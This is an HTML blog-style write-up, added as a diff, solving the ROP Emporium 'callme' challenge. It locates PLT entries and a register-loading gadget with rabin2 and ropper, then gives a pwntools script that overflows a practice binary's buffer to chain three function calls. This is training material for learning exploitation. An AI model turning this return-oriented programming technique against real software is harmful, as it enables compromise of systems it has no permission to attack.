@@ -1,0 +1,102 @@
+<html>                             
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>ROP Emporium Pt. 3: callme</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+<a href="https://ropemporium.com">ROP Emporium</a> is a collection of challenges designed to teach return-oriented 
+programming (ROP) techniques by slowly introducing new concepts and increasing 
+difficulty. If you're looking for a spoiler-free guide, check out the one 
+included on their <a href="https://ropemporium.com/guide.html">website</a>. 
+
+<a href="https://ropemporium.com/challenge/callme.html">callme.html</a>
+───────────────────────────────────────────────────────────────────────────────
+  Procedure Linkage
+  
+  The Procedure Linkage Table (PLT) is used to resolve function addresses in 
+  imported libraries at runtime, it's worth reading up about it. See Appendix A 
+  in the Beginners' guide for a brief explanation of how the PLT is used in lazy 
+  binding. Even better, go ahead and step through the lazy linking process in a 
+  debugger, it's important you understand what resides at the addresses reported 
+  to you by commands like $ rabin2 -i <binary> and $ rabin2 -R <binary>. 
+  Important! To dispose of the need for any RE I'll tell you the following:
+  
+  You must call the callme_one(), callme_two() and callme_three() functions in 
+  that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. 
+  callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the 
+  x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 
+  0xcafebabecafebabe, 0xd00df00dd00df00d) 
+───────────────────────────────────────────────────────────────────────────────
+
+The hint for this challenge lays out pretty clear instructions for how to solve 
+it so all we really have to do is follow that. We can start by finding the 
+addresses of all these functions.
+
+rabin2
+───────────────────────────────────────────────────────────────────
+  $ rabin2 -s ./callme | grep -e "useful" -e "callme"
+  34  ---------- 0x00000000 LOCAL  FILE   0        callme.c
+  36  0x000008f2 0x004008f2 LOCAL  FUNC   74       usefulFunction
+  38  0x0000093c 0x0040093c LOCAL  NOTYPE 0        usefulGadgets
+  3   0x000006f0 0x004006f0 GLOBAL FUNC   16       imp.callme_three
+  7   0x00000720 0x00400720 GLOBAL FUNC   16       imp.callme_one
+  10  0x00000740 0x00400740 GLOBAL FUNC   16       imp.callme_two
+───────────────────────────────────────────────────────────────────
+
+usefulGadgets happens to contain the gadget that we'll need to set our register 
+values before running our functions. We can also find it using ropper.
+
+ropper
+───────────────────────────────────────────
+  $ ropper -f ./callme
+  0x40093c: pop rdi; pop rsi; pop rdx; ret;
+───────────────────────────────────────────
+
+So in theory we should be able to put something together like;
+padding + gadget + arg1 + arg2 + arg3 + function1 + gadget + arg1 + arg2 + arg3 
++ function2 + gadget + arg1 + arg2 + arg3 + function3
+
+Now we just have to write out the python code.
+
+exploit.py
+────────────────────────────────────────────────────
+  from pwn import *
+ 
+  e = ELF('callme')
+  p = process(e.path)
+  context(arch='amd64', os='linux', endian='little')
+
+  gadget = p64(0x40093c)
+  one = p64(0xdeadbeefdeadbeef)
+  two = p64(0xcafebabecafebabe)
+  three = p64(0xd00df00dd00df00d)
+  args = one + two + three
+
+  payload = b'A' * 40
+  payload += gadget
+  payload += args
+  payload += p64(0x400720)
+  payload += gadget
+  payload += args
+  payload += p64(0x400740)
+  payload += gadget
+  payload += args
+  payload += p64(0x4006f0)
+
+  print(payload)
+
+  p.sendline(payload)
+  log.info(p.clean())
+───────────────────────────────────────────────────
+
+See part 4 for more.
+
+// END //
+</pre>
+</body>
+</html>
